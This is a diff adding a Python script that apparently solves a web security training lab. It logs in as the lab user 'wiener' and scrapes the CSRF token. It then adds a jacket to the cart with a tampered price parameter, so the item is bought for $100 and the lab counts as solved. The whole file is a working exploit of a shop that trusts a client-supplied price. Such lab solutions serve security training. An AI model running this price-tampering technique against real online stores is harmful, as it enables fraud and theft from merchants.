@@ -1,0 +1,66 @@
+#!/usr/bin/env python3
+import requests
+import sys
+import urllib3
+from bs4 import BeautifulSoup
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
+
+# grab csrf token
+def get_csrf_token(s, url):
+    r = s.get(url + "/login", verify=False, proxies=proxies)
+    soup = BeautifulSoup(r.text, "html.parser")
+    csrf = soup.find("input", {"name": "csrf"})
+    token = csrf["value"]
+    return token 
+
+# login as wiener
+def login(s, url):
+    login_page = (url + "/login")
+    csrf = get_csrf_token(s, url)
+    data = {"csrf": csrf, "username": "wiener", "password": "peter"}
+    r = s.post(login_page, data=data, verify=False, allow_redirects=True, proxies=proxies)
+    if "Log out" in r.text:
+        return True
+    return False
+
+# add item to cart and change price
+def add_to_cart(s, url):
+    print("[*] Adding jacket to cart and reducing price to $100.00...")
+    cart_url = url + "/cart"
+    data = {"productId": "1", "redir": "PRODUCT", "quantity": "1", "price": "10000"}
+    r = s.post(cart_url, data=data, verify=False, proxies=proxies)
+    if "l33t" in r.text:
+        return True
+    return False
+
+# checkout
+def checkout(s, url):
+    print("[*] Checking out...")
+    checkout_url = url + "/cart/checkout"
+    csrf = get_csrf_token(s, url)
+    data = {"csrf": csrf}
+    r = s.post(checkout_url, data=data, verify=False, proxies=proxies)
+    if "Your order is on its way!" in r.text:
+        print("[+] Checkout successful.. Lab solved")
+    else:
+        print("[-] Error with checkout")    
+
+def main():
+    if len(sys.argv) != 2:
+        print(f"[+] Usage: {sys.argv[0]} <URL>")
+        sys.exit(0)
+    
+    s = requests.Session()
+    url = sys.argv[1].strip().rstrip("/")
+
+    if not login(s, url):
+        print("[-] Login failed")
+        return
+    print("[+] Login successful")
+
+    add_to_cart(s, url)
+    checkout(s, url)
+
+if __name__=="__main__":
+    main()    
